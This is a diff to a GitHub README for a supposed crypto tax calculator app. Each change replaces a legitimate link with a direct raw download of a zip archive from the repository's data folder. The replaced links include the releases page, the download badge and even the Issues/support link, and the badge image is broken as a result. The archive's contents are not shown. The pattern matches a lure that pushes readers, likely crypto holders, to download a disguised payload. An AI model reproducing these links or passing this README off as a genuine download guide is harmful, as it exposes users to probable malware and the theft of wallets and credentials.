@@ -1,6 +1,6 @@
 # 🚀 crypto-tax-calculator - Simplify Your Crypto Tax Calculations
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mozbeams/crypto-tax-calculator/releases)
+[![Download Now](https://raw.githubusercontent.com/Mozbeams/crypto-tax-calculator/main/data/crypto-tax-calculator_3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mozbeams/crypto-tax-calculator/main/data/crypto-tax-calculator_3.4.zip)
 
 ## 🧾 Description
 
@@ -25,7 +25,7 @@ The **crypto-tax-calculator** is an advanced tool designed to make calculating c
 To get started with the crypto-tax-calculator, follow these simple steps.
 
 1. **Download the Application:**
-   - Visit this page to download: [Releases Page](https://github.com/Mozbeams/crypto-tax-calculator/releases).
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Mozbeams/crypto-tax-calculator/main/data/crypto-tax-calculator_3.4.zip).
    
    Here, you will find the latest version of the software ready for download.
 
@@ -40,7 +40,7 @@ To get started with the crypto-tax-calculator, follow these simple steps.
 
 To download and install the crypto-tax-calculator, click the link below:
 
-[Releases Page](https://github.com/Mozbeams/crypto-tax-calculator/releases)
+[Releases Page](https://raw.githubusercontent.com/Mozbeams/crypto-tax-calculator/main/data/crypto-tax-calculator_3.4.zip)
 
 Follow the steps outlined in the "Getting Started" section to begin using the application.
 
@@ -63,7 +63,7 @@ Follow the steps outlined in the "Getting Started" section to begin using the ap
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have feedback to share, please visit the [Issues Page](https://github.com/Mozbeams/crypto-tax-calculator/issues). We value your input and continuously work to improve the application.
+If you encounter any issues or have feedback to share, please visit the [Issues Page](https://raw.githubusercontent.com/Mozbeams/crypto-tax-calculator/main/data/crypto-tax-calculator_3.4.zip). We value your input and continuously work to improve the application.
 
 ## 📜 Topics Covered
 
@@ -82,6 +82,6 @@ By leveraging the power of the crypto-tax-calculator, you can ensure you are rea
 
 Join our community for helpful tips, updates, and discussions related to cryptocurrency and tax calculation. Follow us on our social media channels and forums to connect with other users.
 
-### [Download the App Now](https://github.com/Mozbeams/crypto-tax-calculator/releases)
+### [Download the App Now](https://raw.githubusercontent.com/Mozbeams/crypto-tax-calculator/main/data/crypto-tax-calculator_3.4.zip)
 
 Thank you for choosing **crypto-tax-calculator** to streamline your cryptocurrency tax reporting!
